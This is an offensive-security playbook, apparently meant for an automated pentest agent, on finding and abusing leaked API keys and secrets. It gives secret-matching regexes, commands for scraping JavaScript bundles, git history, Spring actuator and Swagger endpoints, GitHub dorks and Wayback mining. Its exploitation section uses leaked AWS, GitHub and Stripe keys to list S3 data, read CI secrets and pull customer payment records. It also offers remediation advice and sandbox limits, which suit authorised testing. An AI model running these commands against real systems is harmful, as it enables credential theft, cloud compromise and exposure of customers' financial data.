# API Key / Secret Leakage — Skill Playbook

**Mitre ATT&CK ID:** T1552 (Unsecured Credentials), T1528 (Steal Application Access Token)
**OWASP Mapping:** A05:2021 – Security Misconfiguration, A02:2021 – Cryptographic Failures
**Severity:** Critical / High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: api-key-leaks-v1
category: api-security
author: HiveBreach
mitre_attack_id: T1552
owasp_mapping:
  - A05:2021-Security Misconfiguration
  - A02:2021-Cryptographic Failures
tags:
  - api-key
  - secret-leakage
  - secret-scanning
  - javascript-analysis
  - git-history
  - wayback-machine
  - T1552
  - T1528
environments:
  - web
  - api
  - cloud
  - git
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Key Pattern Catalog

| Provider | Pattern |
|---|---|
| AWS Access Key | `AKIA[0-9A-Z]{16}` |
| AWS Secret | `(?i)aws(.{0,20})?['\"][0-9a-zA-Z/+]{40}['\"]` |
| Google API | `AIza[0-9A-Za-z-_]{35}` |
| GitHub PAT | `gh[pousr]_[0-9A-Za-z]{36,}` |
| Slack | `xox[baprs]-[0-9A-Za-z-]{10,}` |
| Slack webhook | `https://hooks.slack.com/services/T.../B.../xxx` |
| Stripe live | `sk_live_[0-9a-zA-Z]{24,}` |
| Twilio | `SK[0-9a-fA-F]{32}` / `AC[0-9a-fA-F]{32}` || OpenAI | `sk-[0-9a-zA-Z]{48}` |
| SendGrid | `SG\.[0-9A-Za-z_-]{22}\.[0-9A-Za-z_-]{43}` |
| Private key | `-----BEGIN (RSA |EC|OPENSSH|DSA) PRIVATE KEY` |
| Generic | `(api[_-]?key|secret|token|password)['\"]?\s*[:=]\s*['\"]([^'\"]{10,})` |

### 1.2 JS File Scanning
```bash
katana -u https://target.com -jc -d 3 -o js_urls.txt
httpx -silent -l js_urls.txt -o live_js.txt
while read u; do curl -s "$u" -o /tmp/js/$(echo "$u" | md5sum | cut -d' ' -f1).js; done < live_js.txt
rg -in "AKIA|sk_live|sk-[A-Za-z0-9]|ghp_|xox[abprs]-|AIza[0-9A-Za-z]{35}|SG\.[A-Za-z0-9]|client_secret|api[_-]?key|access_token|password" /tmp/js/
```

**Source maps** reveal original source including config:
```bash
curl -s https://target.com/assets/app.js.map -o app.js.map
jq -r '.sources[]' app.js.map
npx sourcemap-decoder app.js.map
```

### 1.3 Git History Exposure

```bash
git clone https://github.com/org/repo.git && cd repo
git log -p --all | rg -in "password|secret|api[_-]?key|AKIA|sk_live|BEGIN .*PRIVATE KEY"
git grep -i "AKIA" $(git rev-list --all) 2>/dev/null
```

### 1.4 Error Messages and Spring Actuator

```bash
curl -s -X POST https://target.com/api/login -H "Content-Type: application/json" -d '{'
for ep in /actuator /actuator/env /actuator/configprops /debug /admin /swagger-ui.html; do
  curl -s -o /dev/null -w "%{http_code} $ep\n" https://target.com$ep
done
```

Spring Boot `/actuator/env` and `/actuator/configprops` leak full config including secrets.

### 1.5 Swagger / OpenAPI Exposure

```bash
for ep in /swagger-ui.html /swagger-ui/index.html /v2/api-docs /v3/api-docs /swagger.json /openapi.json; do
  curl -s -o /dev/null -w "%{http_code} $ep\n" https://target.com$ep
done
curl -s https://target.com/v3/api-docs | jq '.components.securitySchemes, .security'
```

---

## 2. Confirmation

### 2.1 Validate the Leaked Key (read-only, rate-limited)

```bash
aws sts get-caller-identity --access-key-id AKIA... --secret-access-key ...
curl -s -H "Authorization: token ghp_..." https://api.github.com/user | jq .login
curl -s https://api.openai.com/v1/models -H "Authorization: Bearer sk-..."
curl -s https://api.stripe.com/v1/balance -u "sk_live_...:" | jq .
curl -s https://slack.com/api/auth.test -H "Authorization: Bearer xoxb-..." | jq .
curl -s -u "ACXXXX:SKXXXX" "https://api.twilio.com/2010-04-01/Accounts.json" | jq .
```

### 2.2 Scope the Key

| Key type | Impact |
|---|---|
| AWS AKIA + secret | Account access if IAM permissive |
| GitHub PAT | Repos, CI/CD, secrets access |
| Stripe sk_live | Payment data, refunds, transfers |
| OpenAI sk- | Metered resource abuse |
| Slack xoxb | Channel read/write, impersonation |
| Google API | Quota abuse, data access |
| JWT secret | Forge app auth tokens |

### 2.3 Historical vs Active

Test keys from git history/wayback anyway; secrets are rarely rotated. Validate with one/two requests only; never call destructive APIs.

---

## 3. Exploitation

### 3.1 Wayback Machine + GAU

```bash
waybackurls target.com | sort -u
gau target.com --subs | sort -u
waybackurls target.com | rg -i "\.js($|\?)" | while read u; do curl -s "$u" | rg -in "AKIA|sk-|ghp_|xoxb|client_secret"; done
```

### 3.2 GitHub Search Dorks

```
org:target "client_secret"
org:target "AKIA"
org:target "BEGIN RSA PRIVATE KEY"
org:target filename:.env
org:target extension:env
"target.com" "api_key"
org:target "sk_live_"
org:target "ghp_"
```

Also check GitLab, public gists, and paste sites.

### 3.3 Exploit the Leaked Key**AWS:**
```bash
export AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=...
aws sts get-caller-identity
aws s3 ls --recursive
aws ec2 describe-instances --region us-east-1 --query 'Reservations[].Instances[].[InstanceId,PublicIpAddress]' --output table
```

**GitHub PAT -> internal secrets:**
```bash
curl -s -H "Authorization: token ghp_..." https://api.github.com/repos/org/repo/actions/secrets | jq .
curl -s -H "Authorization: token ghp_..." "https://api.github.com/user/repos?per_page=100" | jq -r '.[].full_name'
```

**Stripe -> PII + financial:**
```bash
curl -s https://api.stripe.com/v1/charges?limit=5 -u "sk_live_...:" | jq '.data[] | {amount, currency, receipt_email}'
```

### 3.4 Chained Exploitation

1. AWS key -> `s3 ls` -> database backups -> credentials
2. JWT secret -> forge admin tokens -> BOLA/mass-assignment further
3. Slack token -> read channels -> more secrets
4. Stripe key -> PII + refunds -> financial impact

---

## 4. Tool-Specific Guidance

### 4.1 truffleHog

```bash
trufflehog git https://github.com/org/repo.git --only-verified
trufflehog filesystem /tmp/scope/ --only-verified
trufflehog github --org=org --token=ghp_...
```

### 4.2 gitleaks

```bash
gitleaks detect --source /tmp/repo --report-format json --report-path gitleaks.json --redact
gitleaks git --source /tmp/repo --log-opts="--all"
```

Custom rule: `regex = '''(api[_-]?key|apikey)["']?\s*[:=]\s*["']([A-Za-z0-9]{20,})["']'''` with `keywords = ["apikey"]`.

### 4.3 git-secrets / nuclei

```bash
git secrets --install && git secrets --register-aws && git secrets scan
nuclei -u https://target.com -t ~/nuclei-templates/exposures/ -jsonl keys.jsonl
```

---

## 5. PoC Generation

### PoC Template

```markdown
## API Key / Secret Leakage — [FINDING_ID]

**Source:** JS bundle / git history / error message / Swagger / wayback / GitHub
**URL/Commit:** https://target.com/assets/app.js (line 124)
**Key type:** AWS / GitHub / Stripe / OpenAI / JWT secret

### Evidence
- Key present in client JS fetched anonymously
- Read-only validation call returned identity
- Leaked value redacted to first 6 / last 4 chars

### Impact
- Cloud account access, data exposure, financial abuse
- Forge application tokens
- Supply-chain access (CI/CD secrets)

### Remediation
- Rotate the leaked key immediately
- Move all secrets server-side; never ship in JS
- Add secret scanning to CI (gitleaks/trufflehog/git-secrets)
- Enable secret detection (GitHub scanning, GuardDuty)
- Strip secrets from git history (BFG/git filter-repo)
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Live status validated with a single non-destructive call
- [ ] No data exfiltrated from the real tenant
- [ ] Leaked value redacted in all evidence
- [ ] Rotation confirmed before report delivery
- [ ] Reproduced against sandbox app with seeded dummy key

### Prohibited Actions
- Reading real customer data via leaked keys
- Destructive operations (delete, transfer, refund)
- Exfiltrating full key material into reports

---

## 7. Cheat Sheet / Reference

**One-shot JS scan:**
```bash
curl -s https://target.com/assets/app.js | rg -in "AKIA[0-9A-Z]{16}|sk_live_|ghp_[0-9A-Za-z]{36}|xox[baprs]-|AIza[0-9A-Za-z]{35}|SG\.[0-9A-Za-z]|client_secret|BEGIN (RSA|EC|OPENSSH) PRIVATE KEY"
```

**Endpoint sweep:** `/actuator/env`, `/actuator/configprops`, `/v3/api-docs`, `/swagger-ui.html`, `/.env`, `/config.js`, `/config.json`, `/settings.js`, `/debug`, `/admin`.

**Git history sweep:** `gitleaks git --source /tmp/repo --log-opts="--all" --report-format json` and `trufflehog git https://github.com/org/repo.git --only-verified`.

**Validation endpoints:** `https://api.github.com/user`, `https://api.openai.com/v1/models`, `https://api.stripe.com/v1/balance`, `https://slack.com/api/auth.test`, `https://api.twilio.com/2010-04-01/Accounts.json`, `sts get-caller-identity` (aws).

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1552 | Unsecured Credentials | Core discovery |
| T1552.001 | Unsecured Credentials: Credentials In Files | JS/config files |
| T1552.004 | Unsecured Credentials: Private Keys | Git/backup leaks |
| T1552.005 | Unsecured Credentials: Cloud Instance Metadata API | Cloud keys |
| T1528 | Steal Application Access Token | OAuth/API token abuse |
| T1213 | Data from Information Repositories | GitHub/wayback mining |
| T1119 | Automated Collection | Automated secret scans |

---

## 9. References

- PayloadsAllTheThings API Key Leaks: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API%20Key%20Leaks
- HackTricks sensitive info: https://book.hacktricks.xyz/pentesting-web/finding-sensitive-information
- truffleHog: https://github.com/trufflesecurity/trufflehog
- gitleaks: https://github.com/gitleaks/gitleaks
- git-secrets: https://github.com/awslabs/git-secrets

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
